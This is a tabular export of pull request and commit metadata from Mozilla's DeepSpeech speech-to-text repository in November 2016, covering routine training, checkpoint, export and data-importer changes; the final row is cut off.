4322,https://api.github.com/repos/mozilla/DeepSpeech/pulls/184,184,Fix #132 #126 - Inlined WER report inference into train loop,@kdavis-mozilla Could you take a look?,tilmankamp,5991088,2016-11-11T12:59:33Z,CONTRIBUTOR,True,117,112,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3d83117147e01fe769be3c515a0060094709e79b,Fixed some markdown
4323,https://api.github.com/repos/mozilla/DeepSpeech/pulls/184,184,Fix #132 #126 - Inlined WER report inference into train loop,@kdavis-mozilla Could you take a look?,tilmankamp,5991088,2016-11-11T12:59:33Z,CONTRIBUTOR,True,117,112,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0a60b2913c62fe9fd739c32bdb3ee009cc27b39d,Fixed PR comments
4324,https://api.github.com/repos/mozilla/DeepSpeech/pulls/183,183,Fixed #181 Fixed #182,@Cwiiis could you review? (Thanks),kdavis-mozilla,12054740,2016-11-11T12:47:36Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7a9ed08fc00d6cab3ecfdf35cb0a3330754be50e,Fixed #181 Fixed #182
4325,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,763ce2b3292c255ff007634a87abaac473b95f9f,Fixed #164
4326,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8e90c8433712a398afb424e63e82c8ddbf702d27,Modified to have a uniform importer API
4327,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04af4070119856bc965dfc5645b0b2bdbd4ee88f,"Merge pull request #171 from mozilla/issue164

Fixed #164"
4328,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0de34bc4a05fa898164c64b83405afa190ebc467,Fixed #172
4329,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73330104c8caaa5fc9ca37392be3c593ced13ead,Fixed #174
4330,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39e7d5e7c6c0a4d7359aa31696831a4b30e0998f,Fixed typo
4331,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,53c4dc9cf6575eba16613d452e3ec98bf813ec79,"Merge pull request #173 from mozilla/issue172

Fixed #172"
4332,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,418e9e03a74e9ac30cecb41b4f0a2186c0f2a25a,Made dirs server centric
4333,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe7d618b232a6e953bed4c58ece7f93dfe75de13,Export the model on automation
4334,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,774c1dbcea7b5bd8438f13e2aa5f94a36504fb83,"Merge pull request #175 from mozilla/issue174

Issue174"
4335,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,348a2d0f729c5fe27f93f9ef2d34e45a8ce78b6e,"Merge pull request #179 from Cwiiis/export-on-automation

Export the model on automation, fixes #177"
4336,https://api.github.com/repos/mozilla/DeepSpeech/pulls/180,180,Wer update,,lissyx,1645737,2016-11-11T11:18:47Z,COLLABORATOR,True,68,10,6,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f582d76f83d90cefa2d8866134898f5ff8c01333,Merge remote-tracking branch 'upstream/master' into wer-update
4337,https://api.github.com/repos/mozilla/DeepSpeech/pulls/179,179,"Export the model on automation, fixes #177",,Cwiiis,668518,2016-11-11T10:41:09Z,CONTRIBUTOR,True,5,0,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fe7d618b232a6e953bed4c58ece7f93dfe75de13,Export the model on automation
4338,https://api.github.com/repos/mozilla/DeepSpeech/pulls/175,175,Issue174,,kdavis-mozilla,12054740,2016-11-11T06:11:36Z,CONTRIBUTOR,True,50,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,73330104c8caaa5fc9ca37392be3c593ced13ead,Fixed #174
4339,https://api.github.com/repos/mozilla/DeepSpeech/pulls/175,175,Issue174,,kdavis-mozilla,12054740,2016-11-11T06:11:36Z,CONTRIBUTOR,True,50,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,39e7d5e7c6c0a4d7359aa31696831a4b30e0998f,Fixed typo
4340,https://api.github.com/repos/mozilla/DeepSpeech/pulls/175,175,Issue174,,kdavis-mozilla,12054740,2016-11-11T06:11:36Z,CONTRIBUTOR,True,50,0,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,418e9e03a74e9ac30cecb41b4f0a2186c0f2a25a,Made dirs server centric
4341,https://api.github.com/repos/mozilla/DeepSpeech/pulls/173,173,Fixed #172,,kdavis-mozilla,12054740,2016-11-11T05:41:09Z,CONTRIBUTOR,True,5,4,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0de34bc4a05fa898164c64b83405afa190ebc467,Fixed #172
4342,https://api.github.com/repos/mozilla/DeepSpeech/pulls/171,171,Fixed #164,,kdavis-mozilla,12054740,2016-11-10T15:48:21Z,CONTRIBUTOR,True,8,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,763ce2b3292c255ff007634a87abaac473b95f9f,Fixed #164
4343,https://api.github.com/repos/mozilla/DeepSpeech/pulls/171,171,Fixed #164,,kdavis-mozilla,12054740,2016-11-10T15:48:21Z,CONTRIBUTOR,True,8,6,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8e90c8433712a398afb424e63e82c8ddbf702d27,Modified to have a uniform importer API
4344,https://api.github.com/repos/mozilla/DeepSpeech/pulls/170,170,Wer update,,lissyx,1645737,2016-11-10T15:07:05Z,COLLABORATOR,True,21,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32637c2191692c820f9a79bd185a31877e5539d4,Optionally remove old model exports
4345,https://api.github.com/repos/mozilla/DeepSpeech/pulls/170,170,Wer update,,lissyx,1645737,2016-11-10T15:07:05Z,COLLABORATOR,True,21,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,e72e803388ac2b8d12c16ca5421cec8e113debcb,"Merge pull request #159 from Cwiiis/optional-export-removal

Optionally remove old model exports, fixes #158"
4346,https://api.github.com/repos/mozilla/DeepSpeech/pulls/170,170,Wer update,,lissyx,1645737,2016-11-10T15:07:05Z,COLLABORATOR,True,21,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a24e90ae6044d7b5e57f0b981a6386e5a7aa6f37,Fixed #163
4347,https://api.github.com/repos/mozilla/DeepSpeech/pulls/170,170,Wer update,,lissyx,1645737,2016-11-10T15:07:05Z,COLLABORATOR,True,21,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c4fb5b4ba63d121486b072e1f729e99dde735b63,"Merge pull request #165 from mozilla/issue163

Fixed #163"
4348,https://api.github.com/repos/mozilla/DeepSpeech/pulls/170,170,Wer update,,lissyx,1645737,2016-11-10T15:07:05Z,COLLABORATOR,True,21,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88034d1642403932dd036cb9b804e42640ff61af,Don't merge repeated characters in ctc_beam_search_decoder
4349,https://api.github.com/repos/mozilla/DeepSpeech/pulls/170,170,Wer update,,lissyx,1645737,2016-11-10T15:07:05Z,COLLABORATOR,True,21,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a61f7119afbc07ab430dd85cbea30b6aca878975,"Merge pull request #167 from Cwiiis/dont-merge-repeated

Don't merge repeated characters in ctc_beam_search_decoder, fixes #53"
4350,https://api.github.com/repos/mozilla/DeepSpeech/pulls/170,170,Wer update,,lissyx,1645737,2016-11-10T15:07:05Z,COLLABORATOR,True,21,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b3f4f40869539a48be62baca36b5666954e5e5b7,"Do not remove existing checkpoint dirs, update training paramteters

This breaks restore feature. We should let code overwrite existing
checkpoints. This fixes #166.

Change training parameters, to address issue #169."
4351,https://api.github.com/repos/mozilla/DeepSpeech/pulls/170,170,Wer update,,lissyx,1645737,2016-11-10T15:07:05Z,COLLABORATOR,True,21,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a72f5517cfd959b8076770c16973a7c258ec9d53,"Merge pull request #168 from lissyx/issue166

Do not remove existing checkpoint dirs"
4352,https://api.github.com/repos/mozilla/DeepSpeech/pulls/170,170,Wer update,,lissyx,1645737,2016-11-10T15:07:05Z,COLLABORATOR,True,21,11,3,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,f13e44a0dfc3fd747ba0a8413b8b1ab5613343d1,Merge remote-tracking branch 'upstream/master' into wer-update
4353,https://api.github.com/repos/mozilla/DeepSpeech/pulls/168,168,Do not remove existing checkpoint dirs,"This breaks restore feature. We should let code overwrite existing
checkpoints.

Fixes #166",lissyx,1645737,2016-11-10T14:47:51Z,COLLABORATOR,True,4,5,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b3f4f40869539a48be62baca36b5666954e5e5b7,"Do not remove existing checkpoint dirs, update training paramteters

This breaks restore feature. We should let code overwrite existing
checkpoints. This fixes #166.

Change training parameters, to address issue #169."
4354,https://api.github.com/repos/mozilla/DeepSpeech/pulls/167,167,"Don't merge repeated characters in ctc_beam_search_decoder, fixes #53","The documentation is unclear, so I tested this on the ldc set by changing the 'year' in sentence to 'lear', so it included the sequence 'all lear' (which has a repeated character, then a space, then the same character - which I wanted to verify also). I was able to over-fit and produce the correct result.",Cwiiis,668518,2016-11-10T13:58:52Z,CONTRIBUTOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,88034d1642403932dd036cb9b804e42640ff61af,Don't merge repeated characters in ctc_beam_search_decoder
4355,https://api.github.com/repos/mozilla/DeepSpeech/pulls/165,165,Fixed #163,,kdavis-mozilla,12054740,2016-11-10T11:46:24Z,CONTRIBUTOR,True,2,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,a24e90ae6044d7b5e57f0b981a6386e5a7aa6f37,Fixed #163
4356,https://api.github.com/repos/mozilla/DeepSpeech/pulls/162,162,Wer update,,lissyx,1645737,2016-11-10T10:21:33Z,COLLABORATOR,True,13,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,10d1bed314b1a45b1459b99514341a412b33a173,Optionally restore from checkpoints
4357,https://api.github.com/repos/mozilla/DeepSpeech/pulls/162,162,Wer update,,lissyx,1645737,2016-11-10T10:21:33Z,COLLABORATOR,True,13,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0485181d16ab8b0b628637a1ff6564f563146ab8,"Merge pull request #157 from Cwiiis/checkpoint-resuming

Optionally restore from checkpoints, fixes #156"
4358,https://api.github.com/repos/mozilla/DeepSpeech/pulls/162,162,Wer update,,lissyx,1645737,2016-11-10T10:21:33Z,COLLABORATOR,True,13,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06f28af274eb4336e4f0dfc9676749c71838e33f,"Limit training epochs to 6

Fixes #160"
4359,https://api.github.com/repos/mozilla/DeepSpeech/pulls/162,162,Wer update,,lissyx,1645737,2016-11-10T10:21:33Z,COLLABORATOR,True,13,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c2121160509fe19108c77b151433caf8684c198c,"Merge pull request #161 from lissyx/issue160

Limit training epochs to 6"
4360,https://api.github.com/repos/mozilla/DeepSpeech/pulls/162,162,Wer update,,lissyx,1645737,2016-11-10T10:21:33Z,COLLABORATOR,True,13,3,2,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,facc42bec0bee7d9a2de3b1377ffcf4f8d05cb5a,Merge remote-tracking branch 'upstream/master' into wer-update
4361,https://api.github.com/repos/mozilla/DeepSpeech/pulls/161,161,Limit training epochs to 6,Fixes #160,lissyx,1645737,2016-11-10T10:13:52Z,COLLABORATOR,True,1,1,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,06f28af274eb4336e4f0dfc9676749c71838e33f,"Limit training epochs to 6

Fixes #160"
4362,https://api.github.com/repos/mozilla/DeepSpeech/pulls/159,159,"Optionally remove old model exports, fixes #158",,Cwiiis,668518,2016-11-10T10:02:46Z,CONTRIBUTOR,True,14,3,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,32637c2191692c820f9a79bd185a31877e5539d4,Optionally remove old model exports
4363,https://api.github.com/repos/mozilla/DeepSpeech/pulls/157,157,"Optionally restore from checkpoints, fixes #156",,Cwiiis,668518,2016-11-10T09:44:14Z,CONTRIBUTOR,True,12,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,10d1bed314b1a45b1459b99514341a412b33a173,Optionally restore from checkpoints
4364,https://api.github.com/repos/mozilla/DeepSpeech/pulls/155,155,Wer update,,lissyx,1645737,2016-11-09T17:49:11Z,COLLABORATOR,True,27,26,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,41fa09a1ad555df4c7860137d55d9eba4328c4a0,Remove an unnecessary transpose
4365,https://api.github.com/repos/mozilla/DeepSpeech/pulls/155,155,Wer update,,lissyx,1645737,2016-11-09T17:49:11Z,COLLABORATOR,True,27,26,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04dd1f1c11db5b937c4b0733703d388f92897b20,Make random initialiser standard deviation configurable
4366,https://api.github.com/repos/mozilla/DeepSpeech/pulls/155,155,Wer update,,lissyx,1645737,2016-11-09T17:49:11Z,COLLABORATOR,True,27,26,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2f945bd0aa969c84a096e81d566a4426240a49c9,"Merge pull request #154 from Cwiiis/configurable-stddev

Make random initialiser standard deviation configurable, fixes #138"
4367,https://api.github.com/repos/mozilla/DeepSpeech/pulls/155,155,Wer update,,lissyx,1645737,2016-11-09T17:49:11Z,COLLABORATOR,True,27,26,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,9aa64ff4cbb9d16a00604df72f62092e11f25d30,"Merge pull request #147 from Cwiiis/less-transposing

Remove an unnecessary transpose"
4368,https://api.github.com/repos/mozilla/DeepSpeech/pulls/155,155,Wer update,,lissyx,1645737,2016-11-09T17:49:11Z,COLLABORATOR,True,27,26,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,580386e9ca5f9569cb9b281751cd4c193bf1b522,Create saver after initialising new graph when exporting model
4369,https://api.github.com/repos/mozilla/DeepSpeech/pulls/155,155,Wer update,,lissyx,1645737,2016-11-09T17:49:11Z,COLLABORATOR,True,27,26,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ffd3502b7a494c4ded0b13cbfaf8357909aadcc2,"Merge pull request #153 from Cwiiis/export-correct-variables

Export correct variables"
4370,https://api.github.com/repos/mozilla/DeepSpeech/pulls/155,155,Wer update,,lissyx,1645737,2016-11-09T17:49:11Z,COLLABORATOR,True,27,26,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ea391ee657e8f7c79c7510df881185db8ad6766e,Merge remote-tracking branch 'upstream/master' into wer-update
4371,https://api.github.com/repos/mozilla/DeepSpeech/pulls/154,154,"Make random initialiser standard deviation configurable, fixes #138","This makes the standard deviation of the random initialiser for each variable configurable, defaulting to 0.1, as opposed to 1.0.",Cwiiis,668518,2016-11-09T14:40:13Z,CONTRIBUTOR,True,17,12,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,04dd1f1c11db5b937c4b0733703d388f92897b20,Make random initialiser standard deviation configurable
4372,https://api.github.com/repos/mozilla/DeepSpeech/pulls/153,153,Export correct variables,"The current export code will only work correctly after the training cell has been run (it doesn't need to complete, but it does need to run). This is because it calls tf.all_variables() before creating the new graph and ends up using values from the old one. This change allows you to load someone else's checkpoints and export a model from it (tested using reuben's checkpoints).",Cwiiis,668518,2016-11-09T13:35:29Z,CONTRIBUTOR,True,5,2,1,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,580386e9ca5f9569cb9b281751cd4c193bf1b522,Create saver after initialising new graph when exporting model
4373,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,ca98c5aab85e485f304f44403a76bcb7bf25e1b6,Expose text_to_char_array in util/text.py
4374,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,182e20187a8c94f6e445c941e3d7bbffa88c997b,Switch importers to new input pipeline
4375,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c0bb34cfd337054bcd40bf0caaa762886777a9a3,Undo extraction of shared DataSets code from importers
4376,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,dba8f219f73e03ce17ec5526c7a77c9d4547290a,Only start the importers' queue threads after we initialize variables
4377,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fa0fc1443925fe60f71dd436e55e685b0077bf99,"Verify date of merges when pulling list of changes

Fixes #141"
4378,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6bb8654f50ae9030c43b1b402796c398d5ec52d6,Add a README.md file
4379,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2472e14ba9834a9a592f50267ea03aa84563d9ae,"Merge pull request #143 from Cwiiis/add-readme

Add a README.md file, fixes #88"
4380,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,d989e8de09fa80520ec4c0b1e901d3fd0b792c8a,"Make sure the initializer passed to tf.scan doesn't break the API contract

We need to make sure the initializer shape matches the return value
of the callable passed to tf.scan.

This also adds an assertion on the shape of labels and the values
in label_lengths that enforces a condition that is needed for
ctc_label_dense_to_sparse to work."
4381,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,2c6674a6f4e7d75d92b2964274b06fb48153cbda,Update README.md
4382,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,b1fc959f7a19ae297cdc518736e04a18962616ff,Fix #144; Ability to limit amount of samples in TEDLIUM
4383,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c3ddbe1a3bcaa99c5e65ce34fad325c02a22e213,"Merge pull request #142 from lissyx/issue141

Verify date of merges when pulling list of changes"
4384,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,c89ee59f37819a7e51f6283e3bdf8712995f5136,"Merge pull request #145 from mozilla/readme-sox

Adding sox README.md"
4385,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1812c245640abb05f9bb8be6ca3544a6f5d54c68,Update README.md
4386,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,6fb628521de47491121ebd631c880307bbe8afe3,Normalize non-ASCII chars in the importers
4387,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,fc94a2e532a89629272db634f84d52dcee569aac,"Merge pull request #146 from mozilla/issue144

Fix #144; Ability to limit amount of samples in TEDLIUM"
4388,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,0707ad89d2edb807c0747cf117f9a893ced9eb33,Merge branch 'master' into issue109_inputops
4389,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,3ad4f7c6f2421d852ca02426e15d21a8fb754a84,Merge branch 'issue109_inputops'
4390,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,1907f9eead1558278c75a9353932a0ff4f8d3894,"Change automation parameters

Set importer to 'ted' instead of 'ted_lium', fixes #149
Set batch_size to 32, fixes #150"
4391,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,7b668f288b0f3d4651ff68c7a607c1457858b1f7,"Merge pull request #151 from lissyx/fix-automation

Change automation parameters"
4392,https://api.github.com/repos/mozilla/DeepSpeech/pulls/152,152,Wer update,,lissyx,1645737,2016-11-09T12:56:06Z,COLLABORATOR,True,257,153,8,"DeepSpeech is an open source embedded (offline, on-device) speech-to-text engine which can run in real time on devices ranging from a Raspberry Pi 4 to high power GPU servers.",C++,8c0e99ab53ff70198fbe6276ccbd4e9955c9aa58,Merge remote-tracking branch 'upstream/master' into wer-update
4393,https://api.github.com/repos/mozilla/DeepSpeech/pulls/151,151,Change automation parameters,"Set importer to 'ted' instead of 'ted_lium', fixes #149
